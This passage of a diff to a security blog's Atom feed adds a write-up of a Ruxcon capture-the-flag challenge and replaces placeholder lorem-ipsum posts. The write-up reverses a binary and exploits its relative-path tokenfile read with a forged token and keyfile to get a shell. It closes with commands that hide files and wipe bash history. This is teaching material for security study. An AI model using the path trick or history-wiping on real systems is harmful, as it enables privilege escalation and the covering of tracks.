+➜ pwnable2 ./level2 ./key3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Awesome! Sort of … nothing actually happens and we clearly haven’t pwned anything, nor is it raining shellz. Let’s break out IDA to work out how we’re actually going to break this thing.&lt;/p&gt;
+
+&lt;p&gt;Once the binary is loaded and disassembled, jump into the strings window (&lt;code class=&quot;highlighter-rouge&quot;&gt;SHIFT+F12&lt;/code&gt;). We’re assuming that we want to properly authenticate with the binary so let’s trace where the following string is used: “Congratulations. You’re authenticated!” Double click the string, this will jump to a table in the .rodata section, use Ctrl+x to find cross-references to the string, there’s only one in this instance.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2018-02-01-ruxcon-11-pwnable-2-writeup-2.png&quot; alt=&quot;IDA Strings&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So if we authenticate correctly, we get a shell. It sure looks like we’re in the right place. But we can’t read the token file! If we can’t read the token file it’s going to be real difficult to construct a valid keyfile.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2018-02-01-ruxcon-11-pwnable-2-writeup-3.png&quot; alt=&quot;We want to get to here&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If we drill down into the &lt;code class=&quot;highlighter-rouge&quot;&gt;token_from_file&lt;/code&gt; function we find the following interesting code block. There it is! It looks like the program is opening the tokenfile from a relative path rather than an absolute one. We can totally abuse this!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2018-02-01-ruxcon-11-pwnable-2-writeup-4.png&quot; alt=&quot;Relative path to tokenfile&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I forgot to take screenshots during the actual competition but permissions on the tokenfile were such that the user running the level2 binary wasn’t able to read the tokenfile, but they &lt;em&gt;did&lt;/em&gt; allow us to move the binary. Because the tokenfile is being opened from &lt;code class=&quot;highlighter-rouge&quot;&gt;./tokenfile&lt;/code&gt;, if we move the binary to somewhere like &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; and create our own token file, we should be able to authenticate successfully. Let’s test that theory!&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜ /tmp &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; “1:NOENCRYPT&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;winning” &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; key5
+
+➜ /tmp &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; “winning” &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; tokenfile
+
+➜ /tmp ./level2 ./key5
+Key entry too large.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Looks like we’ve missed something. Let’s find the message “Key entry too large” in IDA.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2018-02-01-ruxcon-11-pwnable-2-writeup-5.png&quot; alt=&quot;base64_decode call&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If the comparison fails and the branch isn’t taken the program prints “Key entry too large” and exits. This comparison seems to be comparing a variable to -1 directly after a base64 decode operation. Following the flow in IDA, there are 3 paths from this point. Either the program prints “Key entry too large”, “Incorrectly encoded entry” or it proceeds to the &lt;code class=&quot;highlighter-rouge&quot;&gt;try_authenticate&lt;/code&gt; function. If we break in GDB at the point where &lt;code class=&quot;highlighter-rouge&quot;&gt;base64_decode&lt;/code&gt; is called we see a pointer (0x602660) to our keyfile entry, “winning”, being passed as an argument.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2018-02-01-ruxcon-11-pwnable-2-writeup-6.png&quot; alt=&quot;&amp;quot;winning&amp;quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Decoding “winning” as base64 will clearly fail so perhaps we need to encode our input. Also note that because the binary isn’t stripped, we can see the name of the original source file at the point where GDB breaks: &lt;code class=&quot;highlighter-rouge&quot;&gt;authenticate_with_keyfile_b64dec.c&lt;/code&gt;. Sounds good, let’s try it.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜ /tmp &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; “1:NOENCRYPT” &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; key6
+
+➜ /tmp &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; “winning” | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; key6
+
+➜ /tmp ./level2 ./key6
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# cd /home/level2&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# ls&lt;/span&gt;
+level2 tokenfile
+
+&lt;span class=&quot;c&quot;&gt;# cat tokenfile&lt;/span&gt;
+RUX&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;not_the_actual_flag_but_you_still_win&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# exit&lt;/span&gt;
+Congratulations. You’re authenticated
+
+➜ /tmp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;BOOM, we get a shell, change back to the challenge directory and we can read the tokenfile which contains the original flag (I’m afraid I don’t remember the actual flag).
+We didn’t explore the XOR function but evidentially we didn’t need it to solve the challenge. Perhaps as the subject of a follow-up post.&lt;/p&gt;
+
+&lt;p&gt;As a final note, this challenge was hosted on a server accessible by all teams. That means that anyone watching the bash history can see what you’re doing, making it a delicate operation to solve the challenge without revealing your methods. As a minimum, I’d recommend creating a hidden folder, working from there, then deleting the bash history.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜ pwnable2 &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /.fd788743c5e54c528a6088c650cf8a9d
+
+➜ pwnable2 &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;level2 /.fd788743c5e54c528a6088c650cf8a9d
+
+&amp;lt;pwn all the things&amp;gt;
+
+➜ pwnable2 &lt;span class=&quot;nb&quot;&gt;history&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;
+
+➜ pwnable2 &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /dev/null &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ~/.bash_history
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;You know … just to be sure.&lt;/p&gt;
+
+&lt;p&gt;Happy hunting.&lt;/p&gt;</content>
 
       
       
@@ -179,112 +295,30 @@
 
       
         <author>
-            <name>Bart Simpson</name>
+            <name>x86party</name>
           
           
         </author>
       
 
       
-        <category term="junk" />
+        <category term="ctf" />
       
 
       
-
+        <category term="ctf" />
       
-        <summary type="html">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt. Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit. Some great heading (h2) Proin convallis mi ac felis pharetra aliquam. Curabitur dignissim accumsan rutrum. In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris. Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc. Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est. Another great heading (h2) Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt. Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit. Some great subheading (h3) Proin convallis mi ac felis pharetra aliquam. Curabitur dignissim accumsan rutrum. In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris. Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc. Some great subheading (h3) Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est. This quote will change your life. It will reveal the secrets of the universe, and all the wonders of humanity. Don’t misuse it. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt. Some great subheading (h3) Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit. Proin convallis mi ac felis pharetra aliquam. Curabitur dignissim accumsan rutrum. &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;p&amp;gt;Hello, World!&amp;lt;/p&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris. You might want a sub-subheading (h4) In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris. In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris. But it’s probably overkill (h4) In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris. Oh hai, an unordered list!! In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris. First item, yo Second item, dawg Third item, what what?! Fourth item, fo sheezy my neezy Oh hai, an ordered list!! In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris. First item, yo Second item, dawg Third item, what what?! Fourth item, fo sheezy my neezy Headings are cool! (h2) Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc. Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est. Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc.</summary>
+        <category term="writeup" />
       
-
+        <category term="pwnable" />
       
+        <category term="ida" />
       
-    </entry>
-  
-  
-  
-    <entry>
-      
-      <title type="html">Some articles are just so long they deserve a really long title to see if things will break well</title>
-      
-      
-      <link href="https://blog.x86.party/2017/01/03/super-long-article/" rel="alternate" type="text/html" title="Some articles are just so long they deserve a really long title to see if things will break well" />
-      
-      <published>2017-01-03T00:00:00+00:00</published>
-      <updated>2017-01-03T00:00:00+00:00</updated>
-      <id>https://blog.x86.party/2017/01/03/super-long-article</id>
-      <content type="html" xml:base="https://blog.x86.party/2017/01/03/super-long-article/">&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt. Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit. Proin convallis mi ac felis pharetra aliquam. Curabitur dignissim accumsan rutrum. In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris. Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc. Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est.&lt;/p&gt;
-
-&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt. Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit. Proin convallis mi ac felis pharetra aliquam. Curabitur dignissim accumsan rutrum. In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris. Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc. Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est.&lt;/p&gt;
-
-&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt. Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit. Proin convallis mi ac felis pharetra aliquam. Curabitur dignissim accumsan rutrum. In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris. Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc. Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est.&lt;/p&gt;</content>
-
-      
-      
-      
-      
+        <category term="re" />
       
 
       
-        <author>
-            <name>Yous</name>
-          
-          
-        </author>
-      
-
-      
-        <category term="misc" />
-      
-
-      
-        <category term="lorem" />
-      
-        <category term="ipsum" />
-      
-
-      
-        <summary type="html">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt. Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit. Proin convallis mi ac felis pharetra aliquam. Curabitur dignissim accumsan rutrum. In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris. Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc. Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt. Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit. Proin convallis mi ac felis pharetra aliquam. Curabitur dignissim accumsan rutrum. In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris. Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc. Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt. Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit. Proin convallis mi ac felis pharetra aliquam. Curabitur dignissim accumsan rutrum. In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris. Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc. Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est.</summary>
-      
-
-      
-      
-    </entry>
-  
-  
-  
-    <entry>
-      
-      <title type="html">My Example Post</title>
-      
-      
-      <link href="https://blog.x86.party/2017/01/02/my-example-post/" rel="alternate" type="text/html" title="My Example Post" />
-      
-      <published>2017-01-02T00:00:00+00:00</published>
-      <updated>2017-01-02T00:00:00+00:00</updated>
-      <id>https://blog.x86.party/2017/01/02/my-example-post</id>
-      <content type="html" xml:base="https://blog.x86.party/2017/01/02/my-example-post/">&lt;p&gt;Eos eu docendi tractatos sapientem, brute option menandri in vix, quando vivendo accommodare te ius. Nec melius fastidii constituam id, viderer theophrastus ad sit, hinc semper periculis cum id. Noluisse postulant assentior est in, no choro sadipscing repudiandae vix. Vis in euismod delenit dignissim. Ex quod nostrum sit, suas decore animal id ius, nobis solet detracto quo te.&lt;/p&gt;
-
-&lt;p&gt;No laudem altera adolescens has, volumus lucilius eum no. Eam ei nulla audiam efficiantur. Suas affert per no, ei tale nibh sea. Sea ne magna harum, in denique scriptorem sea, cetero alienum tibique ei eos. Labores persequeris referrentur eos ei.&lt;/p&gt;</content>
-
-      
-      
-      
-      
-      
-
-      
-        <author>
-            <name>Yous</name>
-          
-          
-        </author>
-      
-
-      
-
-      
-
-      
-        <summary type="html">Eos eu docendi tractatos sapientem, brute option menandri in vix, quando vivendo accommodare te ius. Nec melius fastidii constituam id, viderer theophrastus ad sit, hinc semper periculis cum id. Noluisse postulant assentior est in, no choro sadipscing repudiandae vix. Vis in euismod delenit dignissim. Ex quod nostrum sit, suas decore animal id ius, nobis solet detracto quo te. No laudem altera adolescens has, volumus lucilius eum no. Eam ei nulla audiam efficiantur. Suas affert per no, ei tale nibh sea. Sea ne magna harum, in denique scriptorem sea, cetero alienum tibique ei eos. Labores persequeris referrentur eos ei.</summary>
+        <summary type="html">This was the second pwnable challenge at Ruxcon 11. Players would SSH into a server running 64 bit Ubuntu and the SSH user’s home directory contained two files: level2 and tokenfile. file and cat quickly revealed that level2 is an x86–64 ELF executable that hasn’t been stripped. tokenfile is a text file but we can’t read it. Presumably then the aim of the challenge is to read that file! ➜ pwnable2 file level2 level2: ELF 64-bit LSB executable, x86–64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86–64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e98e13b917a49c072e0ba9035947d21ba91a706d, not stripped When we run level2 it requests a keyfile specified as a path or the character “-” which specifies “give me the keyfile on stdin”. Before doing anything, run strings over the binary. It’ll help you get the lay of the land, and in some (silly) cases, you’ll find the flag. Strings doesn’t yield the flag but it does reveal some interesting strings that sound like function names: ➜ pwnable2 strings level2 &amp;lt;snip&amp;gt; parse_header no_keys &amp;lt;snip&amp;gt; auth_scheme sizetype key_for_scheme token_from_file XorDecode try_authenticate &amp;lt;snip&amp;gt; mod_table encoding_table base64_encode base64_decode build_decoding_table base64_cleanup input_length output_length encoded_data &amp;lt;snip&amp;gt; Looks like there’s authentication attempts, parsing, base64, decoding, etc. We’ll start simple though; because we’re mad hax0rz, we’ll initially assume that the password is password. ➜ pwnable2 ./level2 — beans Usage: ./level2 &amp;lt;keyfile&amp;gt; or — for stdin ➜ pwnable2 ./level2 - password Invalid Scheme specified. FOILED! The password wasn’t password. Undeterred, we’ll try running ltrace to look for interesting function calls. ➜ pwnable2 ltrace ./level2 - __libc_start_main(0x400c00, 2, 0x7ffc819d44d8, 0x4017b0 &amp;lt;unfinished …&amp;gt; strcmp(“-”, “-”) = 0 malloc(1032) = 0x16bd010 __isoc99_fscanf(0x7f4c18f5c4e0, 0x401834, 0x16bd010, 0x16bd018 password ) = 0 malloc(0) = 0x16bd420 malloc(4104) = 0x16bd440 strcmp(“”, “XOR”) = -88 strcmp(“”, “NOENCRYPT”) = -78 fprintf(0x7f4c18f5c060, “Invalid Scheme specified.\n”Invalid Scheme specified. ) = 26 +++ exited (status 1) +++ Notice the calls to strcmp(&quot;&quot;, &quot;XOR&quot;) and strcmp(&quot;&quot;, &quot;NOENCRYPT&quot;), followed by the call that prints “Invalid Scheme specified”. Looks like our input will need to pass a comparison with either “XOR” or “NOENCRYPT” (or both!) While that sounds like a good start, notice that our ninja input guess of “password” doesn’t appear in either of those comparisons! hmmm … it looks like our input is being read in via fscanf so let’s break out GDB and find out what’s going on. Note that I’m using the superduper awesome Python Exploit Development Assistant ‘peda.py’ for GDB, it makes GDB not suck in the way that milk makes cereal not suck. Here, we run gdb level2, set a breakpoint for the __isoc99_fscanf function and set up the program arguments to accept input from stdin. Whenever GDB breaks, PEDA prints a dump of the processor state (no more spamming i r!) at the top we have a register dump, followed by disassembly around the current program counter and a memory dump. It looks like rsi contains the format string being passed to fscanf, that’s going to determine what gets read in. The manual for fscanf should contain everything we need to interpret the format string. SCANF(3) Linux Programmer’s Manual SCANF(3) NAME scanf, fscanf, sscanf, vscanf, vsscanf, vfscanf — input format conversion SYNOPSIS #include &amp;lt;stdio.h&amp;gt; int scanf(const char *format, …); int fscanf(FILE *stream, const char *format, …); &amp;lt;snip&amp;gt; The conversion specifications in format are of two forms, either beginning with ‘%’ or beginning with “%n$”. The two forms should not be mixed in the same format string, except that a string containing “%n$” specifications can include %% and %*. If format contains ‘%’ specifications, then these correspond in order with successive pointer arguments. In the “%n$” form (which is specified in POSIX.1–2001, but not C99), n is a decimal integer that specifies that the converted input should be placed in the location referred to by the n-th pointer argument following format. Conversions l Indicates either that the conversion will be one of d, i, o, u, x, X, or n and the next pointer is a pointer to a long int or unsigned long int (rather than int), or that the conversion will be one of e, f, or g and the next pointer is a pointer to double (rather than float). Specifying two l characters is equivalent to L. If used with %c or %s, the corresponding parameter is considered as a pointer to a wide character or wide-character string respectively. u Matches an unsigned decimal integer; the next pointer must be a pointer to unsigned int. s Matches a sequence of non-white-space characters; the next pointer must be a pointer to character array that is long enough to hold the input sequence and the terminating null byte (‘\0’), which is added automatically. The input string stops at white space or at the maximum field width, whichever occurs first. &amp;lt;snip&amp;gt; The fscanf format string, &quot;%lu:%1023s&quot;, can be broken down into the following: %lu — unsigned long : — ASCII character “:” %1023s — 1023 character string (1024 with the null terminator). Before, we just passed in the string “password” and our input didn’t make it to the strcmp instructions. Let’s adjust the format to match the fscanf format string and try again. To make things neater, we’ll also put our input in a keyfile rather than entering it via stdin. ➜ pwnable2 echo “123:password” &amp;gt; key1 Changing the format seems to have worked! We now see the string “password” being compared against “XOR” and “NOENCRYPT”, but we still hit the “Invalid Scheme specified” message. If we change our input to “123:NOENCRYPT” we see the following: strcmp(&quot;NOENCRYPT&quot;, &quot;NOENCRYPT&quot;), looks good! ➜ pwnable2 ltrace ./level2 ./key1 __libc_start_main(0x400c00, 2, 0x7ffe6b0f31e8, 0x4017b0 &amp;lt;unfinished …&amp;gt; strcmp(“./key1”, “-”) = 1 fopen(“./key1”, “r”) = 0x2072010 malloc(1032) = 0x2072250 __isoc99_fscanf(0x2072010, 0x401834, 0x2072250, 0x2072258) = 2 malloc(629760) = 0x7f2d3cf19010 malloc(4104) = 0x2072660 strcmp(“password”, “XOR”) = 24 strcmp(“password”, “NOENCRYPT”) = 34 fprintf(0x7f2d3cdba060, “Invalid Scheme specified.\n”Invalid Scheme specified. ) = 26 +++ exited (status 1) +++ ➜ pwnable2 echo “123:NOENCRYPT” &amp;gt; key2 ➜ pwnable2 ltrace ./level2 ./key2 __libc_start_main(0x400c00, 2, 0x7ffc0232d358, 0x4017b0 &amp;lt;unfinished …&amp;gt; strcmp(“./key2”, “-”) = 1 fopen(“./key2”, “r”) = 0xc43010 malloc(1032) = 0xc43250 __isoc99_fscanf(0xc43010, 0x401834, 0xc43250, 0xc43258) = 2 malloc(629760) = 0x7efc1ddcd010 malloc(4104) = 0xc43660 strcmp(“NOENCRYPT”, “XOR”) = -10 strcmp(“NOENCRYPT”, “NOENCRYPT”) = 0 strcpy(0xc43668, “No Encryption”) = 0xc43668 __isoc99_fscanf(0xc43010, 0x401962, 0x7efc1ddcd010, 0x7efc1ddcd010) = 0xffffffff fprintf(0x7efc1dc6e060, “In.correct number of entries. Exp”…, 123, 0Incorrect number of entries. Expected 123 but found 0 ) = 54 +++ exited (status 1) +++ Now we’re getting the message: “Incorrect number of entries. Expected 123 but found 0”. Looks like that number we pass in is some kind of counter. Apparently our keyfile contains zero entries, let’s try adding stuff to the keyfile. Adding the line “password” changes the message to “Incorrect number of entries. Expected 123 but found 1”, looks like the number we pass in is a counter for the number of lines in the keyfile. ➜ pwnable2 echo “0:NOENCRYPT\npassword” &amp;gt; key3 ➜ pwnable2 ./level2 ./key3 Incorrect number of entries. Expected 123 but found 1 ➜ pwnable2 echo “1:NOENCRYPT\npassword” &amp;gt; key3 ➜ pwnable2 ./level2 ./key3 Awesome! Sort of … nothing actually happens and we clearly haven’t pwned anything, nor is it raining shellz. Let’s break out IDA to work out how we’re actually going to break this thing. Once the binary is loaded and disassembled, jump into the strings window (SHIFT+F12). We’re assuming that we want to properly authenticate with the binary so let’s trace where the following string is used: “Congratulations. You’re authenticated!” Double click the string, this will jump to a table in the .rodata section, use Ctrl+x to find cross-references to the string, there’s only one in this instance. So if we authenticate correctly, we get a shell. It sure looks like we’re in the right place. But we can’t read the token file! If we can’t read the token file it’s going to be real difficult to construct a valid keyfile. If we drill down into the token_from_file function we find the following interesting code block. There it is! It looks like the program is opening the tokenfile from a relative path rather than an absolute one. We can totally abuse this! I forgot to take screenshots during the actual competition but permissions on the tokenfile were such that the user running the level2 binary wasn’t able to read the tokenfile, but they did allow us to move the binary. Because the tokenfile is being opened from ./tokenfile, if we move the binary to somewhere like /tmp and create our own token file, we should be able to authenticate successfully. Let’s test that theory! ➜ /tmp echo -n “1:NOENCRYPT\nwinning” &amp;gt; key5 ➜ /tmp echo -n “winning” &amp;gt; tokenfile ➜ /tmp ./level2 ./key5 Key entry too large. Looks like we’ve missed something. Let’s find the message “Key entry too large” in IDA. If the comparison fails and the branch isn’t taken the program prints “Key entry too large” and exits. This comparison seems to be comparing a variable to -1 directly after a base64 decode operation. Following the flow in IDA, there are 3 paths from this point. Either the program prints “Key entry too large”, “Incorrectly encoded entry” or it proceeds to the try_authenticate function. If we break in GDB at the point where base64_decode is called we see a pointer (0x602660) to our keyfile entry, “winning”, being passed as an argument. Decoding “winning” as base64 will clearly fail so perhaps we need to encode our input. Also note that because the binary isn’t stripped, we can see the name of the original source file at the point where GDB breaks: authenticate_with_keyfile_b64dec.c. Sounds good, let’s try it. ➜ /tmp echo “1:NOENCRYPT” &amp;gt; key6 ➜ /tmp echo -n “winning” | base64 &amp;gt;&amp;gt; key6 ➜ /tmp ./level2 ./key6 # # cd /home/level2 # ls level2 tokenfile # cat tokenfile RUX{not_the_actual_flag_but_you_still_win} # exit Congratulations. You’re authenticated ➜ /tmp BOOM, we get a shell, change back to the challenge directory and we can read the tokenfile which contains the original flag (I’m afraid I don’t remember the actual flag). We didn’t explore the XOR function but evidentially we didn’t need it to solve the challenge. Perhaps as the subject of a follow-up post. As a final note, this challenge was hosted on a server accessible by all teams. That means that anyone watching the bash history can see what you’re doing, making it a delicate operation to solve the challenge without revealing your methods. As a minimum, I’d recommend creating a hidden folder, working from there, then deleting the bash history. ➜ pwnable2 mkdir /.fd788743c5e54c528a6088c650cf8a9d ➜ pwnable2 cp level2 /.fd788743c5e54c528a6088c650cf8a9d &amp;lt;pwn all the things&amp;gt; ➜ pwnable2 history -c ➜ pwnable2 cat /dev/null &amp;gt; ~/.bash_history You know … just to be sure. Happy hunting.</summary>
       
 
       
